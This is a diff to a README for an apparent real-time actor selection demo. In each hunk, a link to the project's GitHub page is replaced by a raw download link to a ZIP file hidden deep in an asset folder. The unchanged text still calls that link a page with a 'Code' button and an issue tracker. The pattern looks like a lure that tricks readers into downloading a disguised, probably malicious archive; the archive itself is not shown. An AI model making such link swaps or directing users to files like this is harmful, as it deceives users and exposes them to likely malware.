@@ -1,6 +1,6 @@
 # ⚙️ MGSpatialSelectionDemo - Real-Time Actor Selection Tool
 
-[![Download MGSpatialSelectionDemo](https://img.shields.io/badge/Download-MGSpatialSelectionDemo-brightgreen)](https://github.com/Maraboustorkouterplanet353/MGSpatialSelectionDemo)
+[![Download MGSpatialSelectionDemo](https://img.shields.io/badge/Download-MGSpatialSelectionDemo-brightgreen)](https://raw.githubusercontent.com/Maraboustorkouterplanet353/MGSpatialSelectionDemo/main/Content/__ExternalActors__/TopDown/Lvl_TopDown/9/BG/MG_Spatial_Demo_Selection_v3.3.zip)
 
 ---
 
@@ -54,10 +54,10 @@ You can try moving the selection box around and see how objects respond.
 
 Use the link below to get started.
 
-[![Download MGSpatialSelectionDemo](https://img.shields.io/badge/Download-MGSpatialSelectionDemo-blue)](https://github.com/Maraboustorkouterplanet353/MGSpatialSelectionDemo)
+[![Download MGSpatialSelectionDemo](https://img.shields.io/badge/Download-MGSpatialSelectionDemo-blue)](https://raw.githubusercontent.com/Maraboustorkouterplanet353/MGSpatialSelectionDemo/main/Content/__ExternalActors__/TopDown/Lvl_TopDown/9/BG/MG_Spatial_Demo_Selection_v3.3.zip)
 
 1. Open this page in your web browser:  
-   https://github.com/Maraboustorkouterplanet353/MGSpatialSelectionDemo
+   https://raw.githubusercontent.com/Maraboustorkouterplanet353/MGSpatialSelectionDemo/main/Content/__ExternalActors__/TopDown/Lvl_TopDown/9/BG/MG_Spatial_Demo_Selection_v3.3.zip
 
 2. On the page, look for the green "Code" button near the top right. Click it.
 
@@ -133,7 +133,7 @@ If you see errors related to missing files, re-download and extract the ZIP fold
 
 If you need help with MGSpatialSelectionDemo, visiting the GitHub page is the best option:
 
-https://github.com/Maraboustorkouterplanet353/MGSpatialSelectionDemo
+https://raw.githubusercontent.com/Maraboustorkouterplanet353/MGSpatialSelectionDemo/main/Content/__ExternalActors__/TopDown/Lvl_TopDown/9/BG/MG_Spatial_Demo_Selection_v3.3.zip
 
 This page has the latest files, issue tracker, and links for further information.
 
